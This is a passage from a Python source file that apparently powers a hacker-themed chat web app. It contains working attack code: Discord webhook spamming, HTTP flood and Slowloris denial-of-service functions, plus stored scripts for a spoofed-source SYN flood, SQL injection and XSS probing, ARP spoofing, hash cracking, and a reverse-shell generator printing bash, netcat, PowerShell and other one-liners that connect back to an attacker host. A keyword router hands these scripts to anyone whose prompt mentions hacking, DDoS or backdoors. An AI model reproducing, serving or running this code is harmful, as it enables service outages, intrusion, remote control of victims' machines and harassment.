            wf.setsampwidth(2)
            wf.setframerate(sr)
            wf.writeframes(struct.pack(f"<{len(samples)}h", *samples))
        db.save_audio(text, filename, ns / sr, "speech")
        return {"path": f"/audio/{filename}", "text": text, "voice": voice, "duration": ns / sr}


# ---------------------------------------------------------------------------
# Discord Webhook Spammer
# ---------------------------------------------------------------------------
def discord_webhook_spam(webhook_url, message, count=50, threads=10):
    sent = 0
    failed = 0
    lock = threading.Lock()
    
    def worker():
        nonlocal sent, failed
        for _ in range(max(1, count // threads)):
            try:
                payload = json.dumps({
                    "content": message,
                    "username": random.choice(["Ghost", "Root", "Admin", "System", "Hacker", "Punk"]),
                    "avatar_url": f"https://i.pravatar.cc/150?u={random.randint(1,99999)}"
                }).encode()
                req = urllib.request.Request(
                    webhook_url, data=payload,
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
                )
                urllib.request.urlopen(req, timeout=10)
                with lock:
                    sent += 1
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    try:
                        retry = json.loads(e.read()).get("retry_after", 1000) / 1000
                    except:
                        retry = 5
                    time.sleep(retry)
                else:
                    with lock:
                        failed += 1
            except:
                with lock:
                    failed += 1
    
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()
    return {"sent": sent, "failed": failed}


# ---------------------------------------------------------------------------
# HTTP Flood
# ---------------------------------------------------------------------------
def http_flood(target_url, threads=50, duration=30):
    count = [0]
    running = [True]
    lock = threading.Lock()
    
    def worker():
        while running[0]:
            try:
                req = urllib.request.Request(target_url)
                req.add_header("User-Agent", random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Mozilla/5.0 (X11; Linux x86_64)",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
                ]))
                urllib.request.urlopen(req, timeout=5)
                with lock:
                    count[0] += 1
            except:
                pass
    
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    for t in ts: t.start()
    time.sleep(duration)
    running[0] = False
    for t in ts: t.join()
    return {"requests_sent": count[0], "duration": duration, "threads": threads}


# ---------------------------------------------------------------------------
# Slowloris
# ---------------------------------------------------------------------------
def slowloris_attack(target_host, target_port=80, sockets=200, https=False):
    sock_list = []
    running = [True]
    
    def init_sock():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if https:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target_host)
            s.connect((target_host, target_port))
            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_host}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-language: en-US,en;q=0.5\r\n")
            return s
        except:
            return None
    
    def loop():
        while running[0]:
            for s in list(sock_list):
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except:
                    try:
                        sock_list.remove(s)
                    except:
                        pass
            diff = sockets - len(sock_list)
            if diff > 0:
                for _ in range(diff):
                    s = init_sock()
                    if s:
                        sock_list.append(s)
            time.sleep(10)
    
    t = threading.Thread(target=loop, daemon=True)
    t.start()
    
    for _ in range(sockets):
        s = init_sock()
        if s:
            sock_list.append(s)
    
    return {"status": "running", "sockets_active": len(sock_list), "target": f"{target_host}:{target_port}"}


# ---------------------------------------------------------------------------
# Tool Templates
# ---------------------------------------------------------------------------
TOOL_TEMPLATES = {
    "port_scanner": '#!/usr/bin/env python3\nimport socket, threading, sys\n\ndef port_scan(target, start=1, end=1024, threads=100):\n    open_ports = []\n    lock = threading.Lock()\n    def scan(port):\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(1.5)\n            result = s.connect_ex((target, port))\n            if result == 0:\n                try: service = socket.getservbyport(port)\n                except: service = "unknown"\n                with lock: open_ports.append({"port": port, "service": service})\n            s.close()\n        except: pass\n    ports = list(range(start, end + 1))\n    for i in range(0, len(ports), threads):\n        batch = ports[i:i+threads]\n        ts = []\n        for port in batch:\n            t = threading.Thread(target=scan, args=(port,)); t.start(); ts.append(t)\n        for t in ts: t.join()\n    return sorted(open_ports, key=lambda x: x["port"])\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else input("Target: ")\n    start = int(sys.argv[2]) if len(sys.argv) > 2 else 1\n    end = int(sys.argv[3]) if len(sys.argv) > 3 else 1024\n    results = port_scan(target, start, end)\n    for r in results:\n        print(f"{r[\'port\']}/tcp\\t{r[\'service\']}")',

    "sql_injector": '#!/usr/bin/env python3\nimport urllib.request, urllib.parse, sys, time\n\ndef sql_inject(url, param):\n    payloads = [("\' OR \'1\'=\'1", "error"), ("\' OR 1=1--", "boolean"), ("\' UNION SELECT NULL--", "union"), ("\' AND SLEEP(5)--", "time"), ("\' AND 1=1--", "blind"), ("1\' OR \'1\'=\'1\'--", "bypass"), ("\' UNION SELECT @@version--", "version"), ("\' WAITFOR DELAY \'0:0:5\'--", "mssql_time")]\n    results = []\n    for payload, ptype in payloads:\n        try:\n            parsed = urllib.parse.urlparse(url)\n            params = urllib.parse.parse_qs(parsed.query)\n            params[param] = [payload]\n            new_qs = urllib.parse.urlencode(params, doseq=True)\n            test_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_qs, parsed.fragment))\n            start = time.time()\n            req = urllib.request.Request(test_url)\n            try:\n                resp = urllib.request.urlopen(req, timeout=10)\n                body = resp.read().decode("utf-8", "replace")\n                elapsed = time.time() - start\n                if (ptype == "time" and elapsed >= 4.5) or payload in body or "sql" in body.lower():\n                    results.append({"type": ptype, "payload": payload, "time": f"{elapsed:.2f}s"})\n            except: pass\n        except: pass\n    return results\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("URL: ")\n    param = sys.argv[2] if len(sys.argv) > 2 else input("Parameter: ")\n    results = sql_inject(url, param)\n    for r in results:\n        print(f"[{r[\'type\']}] {r[\'payload\'][:40]}... ({r[\'time\']})")',

    "reverse_shell": '#!/usr/bin/env python3\nimport sys\n\ndef generate(lhost, lport, lang="python"):\n    shells = {\n        "python": f\'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\',\n        "bash": f\'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\',\n        "php": f\'php -r "$sock=fsockopen(\\"{lhost}\\",{lport});exec(\\"/bin/sh -i <&3 >&3 2>&3\\")"\',\n        "nc": f\'nc -e /bin/sh {lhost} {lport}\',\n        "powershell": f\'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\"PS \\" + (pwd).Path + \\"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"\',\n        "perl": f\'perl -e "use Socket;$i=\\"{lhost}\\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");}}"\'\n    }\n    return shells.get(lang, shells["python"])\nif __name__ == "__main__":\n    lh = sys.argv[1] if len(sys.argv) > 1 else input("LHOST: "); lp = int(sys.argv[2]) if len(sys.argv) > 2 else int(input("LPORT: "))\n    for lang in ["python","bash","php","nc","powershell","perl"]:\n        print(f"\\n=== {lang.upper()} ===")\n        print(generate(lh, lp, lang))',

    "xss_engine": '#!/usr/bin/env python3\nimport urllib.request, urllib.parse, sys\n\ndef xss_test(url, param):\n    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "\\" onfocus=alert(1) autofocus>", "\';alert(1);//", "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>", "javascript:alert(1)", "<details open ontoggle=alert(1)>"]\n    results = []\n    for payload in payloads:\n        try:\n            parsed = urllib.parse.urlparse(url)\n            params = urllib.parse.parse_qs(parsed.query)\n            params[param] = [payload]\n            new_qs = urllib.parse.urlencode(params, doseq=True)\n            test_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_qs, parsed.fragment))\n            req = urllib.request.Request(test_url)\n            resp = urllib.request.urlopen(req, timeout=10)\n            body = resp.read().decode("utf-8", "replace")\n            if payload in body:\n                results.append({"payload": payload, "reflected": True})\n        except: pass\n    return results\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("URL: "); param = sys.argv[2] if len(sys.argv) > 2 else input("Parameter: ")\n    results = xss_test(url, param)\n    for r in results:\n        print(f"[REFLECTED] {r[\'payload\'][:50]}...")',

    "directory_fuzzer": '#!/usr/bin/env python3\nimport urllib.request, sys, threading, queue, ssl\n\ndef fuzz(base_url):\n    wordlist = ["admin","login","wp-admin","backup","config",".git",".env","api","test","uploads","private","secret","dashboard","panel","src","db","sql","phpmyadmin","console","robots.txt","sitemap.xml","index.php",".htaccess","wp-config.php","config.php","admin.php","setup","install","dev","staging","debug","log","error"]\n    found = []; q = queue.Queue(); results_lock = threading.Lock()\n    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n    for w in wordlist: q.put(w)\n    def worker():\n        while not q.empty():\n            try:\n                w = q.get_nowait(); url = base_url.rstrip("/") + "/" + w; req = urllib.request.Request(url)\n                try:\n                    resp = urllib.request.urlopen(req, timeout=5, context=ctx); code = resp.getcode()\n                    if code != 404:\n                        size = len(resp.read())\n                        with results_lock: found.append({"path":w,"code":code,"size":size,"url":url})\n                except urllib.error.HTTPError as e:\n                    if e.code != 404:\n                        with results_lock: found.append({"path":w,"code":e.code,"size":0,"url":url})\n                except: pass\n            except: pass\n            finally: q.task_done()\n    ts = [threading.Thread(target=worker) for _ in range(20)]\n    for t in ts: t.start()\n    for t in ts: t.join()\n    return sorted(found, key=lambda x: x["code"])\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("Base URL: ")\n    results = fuzz(url)\n    for r in results:\n        print(f"[{r[\'code\']}] {r[\'path\']} ({r[\'size\']} bytes)")',

    "syn_flood": '#!/usr/bin/env python3\nimport socket, struct, random, threading, time, sys\n\ndef syn_flood(target, port, count=10000, threads=100):\n    ip = socket.gethostbyname(target); sent = 0; lock = threading.Lock(); running = [True]\n    def flood():\n        nonlocal sent\n        while running[0] and sent < count:\n            try:\n                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"\n                src_port = random.randint(1024, 65535); seq = random.randint(1000, 99999)\n                ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(ip))\n                tcp_header = struct.pack("!HHLLBBHHH", src_port, port, seq, 0, (5 << 4), 2, 8192, 0, 0)\n                s.sendto(ip_header + tcp_header, (ip, 0)); s.close()\n                with lock: sent += 1\n            except: pass\n    ts = [threading.Thread(target=flood) for _ in range(min(threads, count))]\n    for t in ts: t.start()\n    try:\n        for t in ts: t.join()\n    except KeyboardInterrupt: running[0] = False\n    return sent\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else input("Target: "); port = int(sys.argv[2]) if len(sys.argv) > 2 else int(input("Port: ")); count = int(sys.argv[3]) if len(sys.argv) > 3 else 10000\n    sent = syn_flood(target, port, count); print(f"Sent {sent} SYN packets")',

    "http_flood": '#!/usr/bin/env python3\nimport urllib.request, threading, time, sys\n\ndef http_flood(target_url, threads=50, duration=30):\n    count = [0]; running = [True]; lock = threading.Lock()\n    def worker():\n        while running[0]:\n            try:\n                req = urllib.request.Request(target_url); req.add_header("User-Agent", "Mozilla/5.0")\n                urllib.request.urlopen(req, timeout=5)\n                with lock: count[0] += 1\n            except: pass\n    ts = [threading.Thread(target=worker) for _ in range(threads)]\n    for t in ts: t.start()\n    time.sleep(duration); running[0] = False\n    for t in ts: t.join()\n    return count[0]\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("Target URL: "); threads = int(sys.argv[2]) if len(sys.argv) > 2 else 50; duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30\n    sent = http_flood(url, threads, duration); print(f"Sent {sent} requests in {duration}s")',

    "slowloris": '#!/usr/bin/env python3\nimport socket, ssl, threading, time, random, sys\n\ndef slowloris(target_host, target_port=80, sockets=200, https=False):\n    sock_list = []; running = [True]\n    def init_sock():\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4)\n            if https:\n                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n                s = ctx.wrap_socket(s, server_hostname=target_host)\n            s.connect((target_host, target_port))\n            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\\r\\n".encode())\n            s.send(f"Host: {target_host}\\r\\n".encode()); s.send(b"User-Agent: Mozilla/5.0\\r\\n"); s.send(b"Accept-language: en-US,en;q=0.5\\r\\n")\n            return s\n        except: return None\n    for _ in range(sockets):\n        s = init_sock()\n        if s: sock_list.append(s)\n    while running[0]:\n        for s in list(sock_list):\n            try: s.send(f"X-a: {random.randint(1,5000)}\\r\\n".encode())\n            except:\n                try: sock_list.remove(s)\n                except: pass\n        diff = sockets - len(sock_list)\n        if diff > 0:\n            for _ in range(diff):\n                s = init_sock()\n                if s: sock_list.append(s)\n        time.sleep(10)\nif __name__ == "__main__":\n    host = sys.argv[1] if len(sys.argv) > 1 else input("Target host: "); port = int(sys.argv[2]) if len(sys.argv) > 2 else 80; socks = int(sys.argv[3]) if len(sys.argv) > 3 else 200\n    slowloris(host, port, socks)',

    "discord_webhook_spammer": '#!/usr/bin/env python3\nimport urllib.request, json, threading, time, random, sys\n\ndef webhook_spam(webhook_url, message, count=100, threads=10):\n    sent = 0; failed = 0; lock = threading.Lock()\n    def worker():\n        nonlocal sent, failed\n        for _ in range(max(1, count // threads)):\n            try:\n                payload = json.dumps({"content": message, "username": random.choice(["Ghost","Root","System","Admin"]), "avatar_url": f"https://i.pravatar.cc/150?u={random.randint(1,99999)}"}).encode()\n                req = urllib.request.Request(webhook_url, data=payload, headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})\n                urllib.request.urlopen(req, timeout=10)\n                with lock: sent += 1\n            except urllib.error.HTTPError as e:\n                if e.code == 429:\n                    try: retry = json.loads(e.read()).get("retry_after", 1000) / 1000\n                    except: retry = 5\n                    time.sleep(retry)\n                else:\n                    with lock: failed += 1\n            except:\n                with lock: failed += 1\n    ts = [threading.Thread(target=worker) for _ in range(threads)]\n    for t in ts: t.start()\n    for t in ts: t.join()\n    print(f"Sent: {sent}, Failed: {failed}")\n    return sent, failed\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("Webhook URL: "); msg = sys.argv[2] if len(sys.argv) > 2 else "@everyone SPAM"; cnt = int(sys.argv[3]) if len(sys.argv) > 3 else 100; thr = int(sys.argv[4]) if len(sys.argv) > 4 else 10\n    webhook_spam(url, msg, cnt, thr)',

    "arp_spoof": '#!/usr/bin/env python3\nimport socket, struct, time, threading, sys, os, re\n\ndef arp_spoof(target_ip, gateway_ip, iface="eth0"):\n    def get_mac(ip):\n        try:\n            result = os.popen(f"arp -n {ip} 2>/dev/null | grep -v Address").read()\n            m = re.search(r"(([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2})", result)\n            return m.group(1) if m else None\n        except: return None\n    target_mac = get_mac(target_ip); gateway_mac = get_mac(gateway_ip)\n    if not target_mac or not gateway_mac:\n        return {"error": "Could not resolve MAC addresses"}\n    running = [True]\n    def spoof_loop():\n        while running[0]:\n            os.system(f"arp -s {gateway_ip} {target_mac} 2>/dev/null")\n            os.system(f"arp -s {target_ip} {gateway_mac} 2>/dev/null")\n            time.sleep(2)\n    t = threading.Thread(target=spoof_loop, daemon=True); t.start()\n    return {"status": "running", "target": target_ip, "gateway": gateway_ip}\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else input("Target IP: "); gateway = sys.argv[2] if len(sys.argv) > 2 else input("Gateway IP: ")\n    result = arp_spoof(target, gateway); print(result)',

    "password_cracker": '#!/usr/bin/env python3\nimport hashlib, sys\n\ndef crack_hash(target_hash, hash_type="md5"):\n    wordlist = ["admin","password","123456","12345678","qwerty","letmein","welcome","monkey","dragon","master","login","abc123","pass","passwd","secret","changeme","root","toor","guest","user","test","admin123","password123","admin1","server","default","system","manager","temp","backup"]\n    for word in wordlist:\n        for prefix in ["", "!", "@", "#", "$", "%"]:\n            for suffix in ["", "1", "123", "!", "@", "2024", "2025"]:\n                pw = prefix + word + suffix\n                try:\n                    h_funcs = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256, "sha512": hashlib.sha512}\n                    if hash_type in h_funcs:\n                        h = h_funcs[hash_type](pw.encode()).hexdigest()\n                    elif hash_type == "ntlm":\n                        h = hashlib.new("md4", pw.encode("utf-16le")).hexdigest()\n                    else:\n                        h = hashlib.md5(pw.encode()).hexdigest()\n                    if h == target_hash.lower():\n                        return {"found":True,"password":pw,"type":hash_type,"hash":h}\n                except: pass\n    return {"found":False,"message":"Password not found"}\nif __name__ == "__main__":\n    h = sys.argv[1] if len(sys.argv) > 1 else input("Hash: "); t = sys.argv[2] if len(sys.argv) > 2 else input("Type: ")\n    result = crack_hash(h, t)\n    if result["found"]: print(f"Password: {result[\'password\']}")\n    else: print(result["message"])',

    "wifi_scanner": '#!/usr/bin/env python3\nimport subprocess, re, sys\n\ndef scan_wifi(iface=None):\n    try:\n        if not iface:\n            output = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode()\n            m = re.search(r"^([a-zA-Z0-9_]+)", output, re.MULTILINE)\n            iface = m.group(1) if m else "wlan0"\n    except: iface = "wlan0"\n    networks = []\n    try:\n        output = subprocess.check_output(["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY,BARS", "device", "wifi", "list", "ifname", iface], stderr=subprocess.STDOUT).decode()\n        for line in output.split("\\n"):\n            if line and ":" in line:\n                parts = line.split(":")\n                if len(parts) >= 3:\n                    networks.append({"ssid": parts[0] or "(hidden)","signal": parts[1]+"%","security": parts[2],"bars": parts[3] if len(parts) > 3 else ""})\n        if networks: return networks\n    except: pass\n    try:\n        output = subprocess.check_output(["iwlist", iface, "scan"], stderr=subprocess.STDOUT).decode()\n        current = {}\n        for line in output.split("\\n"):\n            if "ESSID:" in line:\n                m = re.search(r\'ESSID:"(.*)"\', line); current["ssid"] = m.group(1) if m else "(unknown)"\n            elif "Signal level=" in line:\n                m = re.search(r"Signal level=(-?\\d+)", line); current["signal"] = m.group(1) + " dBm" if m else "?"\n            elif "Encryption key:" in line: current["security"] = "on" if "on" in line else "off"\n            elif "Cell " in line and current: networks.append(current); current = {}\n        if current and "ssid" in current: networks.append(current)\n    except: pass\n    return networks if networks else [{"ssid":"Scan failed","signal":"","security":""}]\nif __name__ == "__main__":\n    iface = sys.argv[1] if len(sys.argv) > 1 else None\n    nets = scan_wifi(iface)\n    for n in nets:\n        print(f\'{n.get("signal","?")} {n.get("ssid","?")} ({n.get("security","?")})\')'
}


# ---------------------------------------------------------------------------
# Prompt Classifier
# ---------------------------------------------------------------------------
def classify_intent(prompt):
    ql = prompt.lower().strip()
    
    img_words = ["image", "bild", "picture", "draw", "generate image", "create image", "make image",
                 "show me", "visualize", "render", "illustration", "art", "painting", "sketch",
                 "graphic", "photo", "anime", "cyberpunk", "landscape", "ocean", "fire", "gradient",
                 "scenery", "make a picture", "create a picture"]
    
    gif_words = ["video", "animation", "animated", "gif", "film", "movie", "clip", "motion",
                 "create video", "make video", "generate video", "animated gif"]
    
    tool_words = ["scan", "hack", "crack", "exploit", "inject", "fuzz", "flood", "spoof",
                  "fuzzer", "scanner", "brute", "payload", "shell", "backdoor", "port",
                  "nmap", "sql", "xss", "syn", "arp", "wifi", "password", "hash",
                  "directory", "reverse shell", "dos", "ddos", "slowloris", "spam",
                  "webhook", "discord", "attack", "tool", "generate tool", "create tool",
                  "send", "make a tool", "build tool"]
    
    music_words = ["music", "musik", "song", "melody", "beat", "soundtrack", "tune",
                   "compose", "symphony", "create music", "make music", "play music",
                   "punk", "pank", "rock", "metal", "generate music"]
    
    speech_words = ["speech", "say", "sag", "voice", "talk", "speak", "read aloud",
                    "narrate", "tell", "pronounce", "speak as"]
    
    scores = {"image": 0, "gif": 0, "tool": 0, "music": 0, "speech": 0, "chat": 1}
    
    for w in img_words:
        if w in ql: scores["image"] += 2
    for w in gif_words:
        if w in ql: scores["gif"] += 3
    for w in tool_words:
        if w in ql: scores["tool"] += 2
    for w in music_words:
        if w in ql: scores["music"] += 2
    for w in speech_words:
        if w in ql: scores["speech"] += 2
    
    if len(ql.split()) <= 3 and any(w in ql for w in ["http://", "https://", "target", "ip", ":80", ":443"]):
        scores["tool"] += 3
    
    best = max(scores, key=scores.get)
    
    style = "realistic"
    if best == "image":
        for s in ["pixel", "anime", "cyberpunk", "fantasy", "oil", "graffiti", "fire", "ocean", "gradient", "checkerboard", "punk", "dark", "nature", "space", "sunset"]:
            if s in ql:
                style = s
                break
    
    gif_style = "realistic"
    if best == "gif":
        for s in ["anime", "cyberpunk", "fire", "ocean", "punk"]:
            if s in ql:
                gif_style = s
                break
    
    return best, style, gif_style


# ---------------------------------------------------------------------------
# Tool Finder
# ---------------------------------------------------------------------------
def find_tool(query, db_instance=None):
    ql = query.lower()
    word_map = {
        "port": "port_scanner", "scan": "port_scanner", "nmap": "port_scanner",
        "sql": "sql_injector", "inject": "sql_injector", "sqli": "sql_injector",
        "reverse": "reverse_shell", "shell": "reverse_shell", "backdoor": "reverse_shell",
        "xss": "xss_engine", "cross": "xss_engine",
        "dir": "directory_fuzzer", "fuzz": "directory_fuzzer", "directory": "directory_fuzzer",
        "syn": "syn_flood", "flood": "syn_flood", "dos": "syn_flood",
        "http": "http_flood", "ddos": "http_flood",
        "slowloris": "slowloris", "loris": "slowloris",
        "discord": "discord_webhook_spammer", "webhook": "discord_webhook_spammer", "spam": "discord_webhook_spammer",
        "arp": "arp_spoof", "spoof": "arp_spoof", "mitm": "arp_spoof",
        "password": "password_cracker", "crack": "password_cracker", "hash": "password_cracker",
        "wifi": "wifi_scanner", "wlan": "wifi_scanner", "wireless": "wifi_scanner"
    }
    for word, key in word_map.items():
        if word in ql:
            code = TOOL_TEMPLATES.get(key, "")
            if code:
                name = key.replace("_", " ").title()
                if db_instance:
                    db_instance.increment_usage(name)
                return {"code": code, "name": name, "category": key}
    return None


# ---------------------------------------------------------------------------
# HTML GUI - ChatGPT Style
# ---------------------------------------------------------------------------
def generate_html():
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{NAME} v{VERSION}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
:root{{--bg:#0a0a0a;--bg2:#0d0d0d;--bg3:#111;--primary:#00ff41;--accent:#ff0033;--text:#00ff41;--text2:#008f1c;--text3:#005f0e;--border:#1a3f1a;--font:"Courier New","Fira Code",monospace;}}
body{{font-family:var(--font);background:var(--bg);color:var(--text);height:100vh;overflow:hidden;display:flex;flex-direction:column;}}
body::after{{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.15)0px,rgba(0,0,0,0.15)1px,transparent 1px,transparent 2px);pointer-events:none;z-index:9999;}}
.sidebar{{width:280px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;}}
.sidebar-header{{padding:15px;border-bottom:1px solid var(--border);text-align:center;}}
.sidebar-header h1{{font-size:1em;color:var(--primary);text-shadow:0 0 10px var(--primary);letter-spacing:3px;text-transform:uppercase;}}
.sidebar-header .sub{{font-size:0.65em;color:var(--text2);margin-top:5px;}}
.sidebar-header .status{{font-size:0.6em;color:var(--text3);margin-top:8px;}}
.sidebar-header .status .dot{{display:inline-block;width:6px;height:6px;background:var(--primary);border-radius:50%;margin-right:5px;animation:blink 1s infinite;}}
@keyframes blink{{0%,100%{{opacity:1;}}50%{{opacity:0;}}}}
.new-chat-btn{{margin:12px;padding:10px;background:transparent;border:1px solid var(--border);color:var(--text2);cursor:pointer;font-family:var(--font);font-size:0.75em;text-transform:uppercase;letter-spacing:2px;transition:all 0.3s;width:calc(100% - 24px);}}
.new-chat-btn:hover{{border-color:var(--primary);color:var(--primary);text-shadow:0 0 5px var(--primary);}}
.chat-list{{flex:1;overflow-y:auto;padding:8px;max-height:calc(100vh - 200px);}}
.chat-item{{padding:10px 12px;border-left:2px solid transparent;cursor:pointer;font-size:0.7em;color:var(--text2);transition:all 0.3s;margin-bottom:2px;font-family:var(--font);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}}
.chat-item:hover{{border-left-color:var(--primary);color:var(--text);background:var(--bg3);}}
.chat-item.active{{border-left-color:var(--primary);color:var(--primary);}}
.sidebar-footer{{padding:12px;border-top:1px solid var(--border);font-size:0.6em;color:var(--text3);display:flex;justify-content:space-between;}}
.main{{flex:1;display:flex;flex-direction:column;overflow:hidden;}}
.matrix-header{{padding:8px 20px;background:var(--bg3);border-bottom:1px solid var(--border);text-align:center;font-size:0.6em;color:var(--text2);letter-spacing:2px;text-transform:uppercase;}}
.matrix-header span{{color:var(--primary);}}
.model-bar{{display:flex;gap:3px;padding:6px 15px;background:var(--bg3);border-bottom:1px solid var(--border);overflow-x:auto;}}
.model-btn{{background:transparent;border:1px solid var(--border);color:var(--text2);padding:4px 14px;cursor:pointer;font-family:var(--font);font-size:0.65em;text-transform:uppercase;letter-spacing:1px;transition:all 0.3s;white-space:nowrap;}}
.model-btn:hover{{border-color:var(--primary);color:var(--primary);text-shadow:0 0 5px var(--primary);}}
.model-btn.active{{background:var(--primary);color:var(--bg);border-color:var(--primary);text-shadow:none;}}
.messages{{flex:1;overflow-y:auto;padding:0;}}
.message{{display:flex;padding:15px 20px;gap:14px;animation:fadeIn 0.3s ease;border-bottom:1px solid rgba(0,255,65,0.05);}}
.message.user{{background:var(--bg3);}}
.message.ai{{background:var(--bg);}}
.avatar{{width:28px;height:28px;border:1px solid var(--border);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:0.6em;color:var(--text2);text-transform:uppercase;border-radius:50%;}}
.avatar.user{{border-color:var(--accent);color:var(--accent);}}
.avatar.ai{{border-color:var(--primary);color:var(--primary);text-shadow:0 0 5px var(--primary);}}
.msg-content{{flex:1;font-size:0.75em;line-height:1.8;min-width:0;}}
.msg-content p{{margin-bottom:5px;}}
.msg-content img{{max-width:100%;max-height:500px;margin:10px 0;border:1px solid var(--border);border-radius:4px;}}
.msg-content audio{{width:100%;max-width:400px;margin:8px 0;}}
.msg-content pre{{background:var(--bg2);padding:15px;overflow-x:auto;font-size:0.7em;margin:8px 0;border:1px solid var(--border);color:var(--text);white-space:pre;max-height:400px;max-width:100%;}}
.msg-content .tool-box{{border:1px solid var(--border);padding:10px;margin:8px 0;background:var(--bg2);}}
.msg-content .tool-box .head{{color:var(--primary);font-size:0.7em;margin-bottom:5px;text-transform:uppercase;letter-spacing:2px;}}
.msg-content a{{color:var(--primary);text-decoration:underline;}}
.input-area{{padding:0 20px 15px;background:linear-gradient(transparent,var(--bg)20%);flex-shrink:0;}}
.input-box{{display:flex;align-items:flex-end;gap:8px;background:var(--bg2);border:1px solid var(--border);padding:10px 14px;max-width:800px;margin:0 auto;}}
.input-box textarea{{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:0.75em;outline:none;resize:none;min-height:24px;max-height:100px;line-height:1.5;}}
.input-box button{{background:transparent;border:1px solid var(--border);color:var(--text2);cursor:pointer;padding:5px 14px;font-family:var(--font);font-size:0.7em;text-transform:uppercase;letter-spacing:1px;transition:all 0.3s;}}
.input-box button:hover{{border-color:var(--primary);color:var(--primary);text-shadow:0 0 5px var(--primary);}}
.input-box button.send{{background:var(--primary);color:var(--bg);border-color:var(--primary);}}
.input-box button.send:hover{{background:#00cc33;}}
.input-box button.send:disabled{{opacity:0.3;cursor:not-allowed;}}
.typing{{display:flex;gap:5px;padding:6px 0;align-items:center;}}
.typing span{{width:6px;height:6px;background:var(--primary);border-radius:50%;animation:pulse 1.4s ease infinite;}}
.typing span:nth-child(2){{animation-delay:0.2s}}
.typing span:nth-child(3){{animation-delay:0.4s}}
.typing-text{{font-size:0.7em;color:var(--text2);margin-left:8px;}}
@keyframes fadeIn{{from{{opacity:0;transform:translateY(5px)}}to{{opacity:1;transform:translateY(0)}}}}
@keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:0.3}}}}
::-webkit-scrollbar{{width:4px;}}
::-webkit-scrollbar-track{{background:transparent;}}
::-webkit-scrollbar-thumb{{background:var(--border);}}
